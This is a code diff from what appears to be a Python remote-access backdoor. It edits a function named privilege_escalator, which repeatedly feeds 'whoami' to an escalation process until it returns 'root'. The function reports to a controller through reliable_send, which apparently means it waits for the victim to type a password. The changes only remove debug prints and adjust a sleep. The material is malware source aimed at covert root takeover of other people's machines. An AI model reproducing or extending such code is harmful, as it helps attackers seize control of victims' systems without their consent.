@@ -230,18 +230,14 @@ def privilege_escalator(command):
 
             # Check that user input password or not
             while True:
-                print("w")
-                time.sleep(2)
+                
+                time.sleep(1)
                 reliable_send("Waiting user input PASS")
-                print("t")
                 esc_process.stdin.write("whoami".encode() + b'\n')
-                print('first esc')
                 esc_process.stdin.flush()
-                print('second esc')
                 if read_stream_result == "root":
                     reliable_send("USER has already input PASS")
                     break
-                print("EnD LOOP")
             
             if esc_process:
                 # run command for escalate specfic user in esc_process
